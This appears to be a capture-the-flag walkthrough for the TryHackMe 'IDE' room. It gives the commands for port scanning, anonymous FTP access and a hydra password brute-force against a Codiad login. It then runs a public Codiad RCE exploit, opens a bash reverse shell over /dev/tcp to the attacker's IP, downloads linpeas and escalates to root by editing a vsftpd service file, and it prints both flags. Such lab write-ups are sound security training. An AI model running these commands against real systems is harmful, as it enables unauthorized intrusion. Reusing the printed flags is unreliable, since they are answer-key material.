---
description: https://tryhackme.com/room/ide
---

# IDE

![](../../.gitbook/assets/10.10.45.178.png)

## Task 1 Flags

#### user.txt

```bash
rustscan -a 10.10.45.178 -- -n -sV -sC
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-16-14.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-17-21.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-17-52.png>)

```bash
lftp -u Anonymous, 10.10.45.178
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-27-12.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-34-37.png>)

```bash
hydra -l john -P /usr/share/wordlists/rockyou.txt \
'http-post-form://10.10.45.178:62337/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect' \
-t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-42-55.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-43-35.png>)

```bash
searchsploit codiad 2.8.4
searchsploit -m 49705
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-49-13.png>)

```bash
python3 49705.py http://10.10.45.178:62337/ \
                 john password 10.6.9.176 4444 linux
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-52-37.png>)

```bash
echo 'bash -c "bash -i >/dev/tcp/10.6.9.176/4445 0>&1 2>&1"' | nc -lnvp 4444
```

```bash
nc -lnvp 4445
find / -type f -name user.txt 2>/dev/null
cat /home/drac/user.txt
ls -l /home/drac/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-52-52.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-55-46.png>)

```bash
wget http://10.6.9.176/linpeas.sh
bash linpeas.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 14-59-18.png>)

```bash
ssh drac@10.10.45.178
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 15-01-47.png>)

{% hint style="success" %}
`02930d21a8eb009f6d26361b2d24a466`
{% endhint %}



#### root.txt

```bash
sudo -l
ls -l /lib/systemd/system/vsftpd.service
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 15-34-29.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-19 15-12-41.png>)

```bash
vim /lib/systemd/system/vsftpd.service
sudo /usr/sbin/service vsftpd restart
systemctl daemon-reload
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 15-18-42.png>)

```bash
nc -nvlp 4446
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 15-23-05.png>)

{% hint style="success" %}
`ce258cb16f47f1c66f0b0b77f4e0fb8d`
{% endhint %}

## Xmind

{% file src="../../.gitbook/assets/10.10.45.178.xmind" %}
